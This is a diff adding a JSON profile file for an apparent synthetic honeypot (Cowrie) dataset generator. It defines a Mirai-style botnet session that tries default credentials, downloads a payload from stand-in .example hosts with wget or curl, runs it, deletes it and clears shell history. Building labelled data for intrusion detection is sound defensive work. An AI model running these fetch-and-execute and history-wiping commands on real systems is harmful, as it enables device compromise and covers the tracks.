@@ -1,0 +1,121 @@
+{
+  "version": "2.3.0-revised",
+  "description": "Revised V2 profiles (2026-11-10, task 12): shared command families across categories to reduce template fingerprints found by reports/v2_feature_leakage_validation/report.md, keeping each category's distinct behaviour. Cowrie-compatible (no ssh/scp, wget only to .example names). No per-profile timing: generator 2.1 uses one category-independent PacingPolicy. Design: docs/profile_redesign_v2.md.",
+  "placeholders": {
+    "ip": [
+      "192.0.2.10",
+      "198.51.100.20",
+      "203.0.113.30",
+      "192.0.2.40"
+    ],
+    "lan_ip": [
+      "192.0.2.5",
+      "192.0.2.12",
+      "198.51.100.10",
+      "203.0.113.8"
+    ],
+    "domain": [
+      "files.example",
+      "mirror.example",
+      "pkg-repo.example"
+    ],
+    "bin": [
+      "b.sh",
+      "malware.sh",
+      "update.sh",
+      "payload"
+    ],
+    "user": [
+      "support",
+      "sysbackup",
+      "ftpuser"
+    ],
+    "dir": [
+      "/tmp",
+      "/var/tmp",
+      "/dev/shm"
+    ]
+  },
+  "profiles": [
+    {
+      "name": "botnet",
+      "attack_cat": "botnet",
+      "label": 1,
+      "held_out": false,
+      "description": "Mirai-style dropper: architecture check, writable directory, download attempt, make executable, run, clean up.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "support"
+        ],
+        "passwords": [
+          "admin",
+          "1234",
+          "support",
+          "default"
+        ],
+        "failed_attempts": [
+          0,
+          2
+        ]
+      },
+      "steps": [
+        [
+          "uname -a",
+          "uname -m",
+          "cat /proc/cpuinfo"
+        ],
+        [
+          "cd {dir}",
+          "cd /tmp || cd /var/tmp"
+        ],
+        [
+          "wget http://{domain}/{bin}",
+          "curl -O http://{domain}/{bin}",
+          "wget -q http://{domain}/{bin} -O {bin}"
+        ],
+        [
+          "chmod +x {bin}",
+          "chmod 777 {bin}"
+        ],
+        [
+          "./{bin}",
+          "sh {bin}"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "rm -rf {bin}",
+            "rm {bin}"
+          ]
+        },
+        {
+          "p": 0.3,
+          "cmd": [
+            "history -c",
+            "unset HISTFILE"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "enable",
+        "system",
+        "shell",
+        "id",
+        "w"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    }
+  ],
+  "derived_from": {
+    "file": "dataset_builder/profiles_v2_compat.json",
+    "version": "2.2.0-compat"
+  }
+}
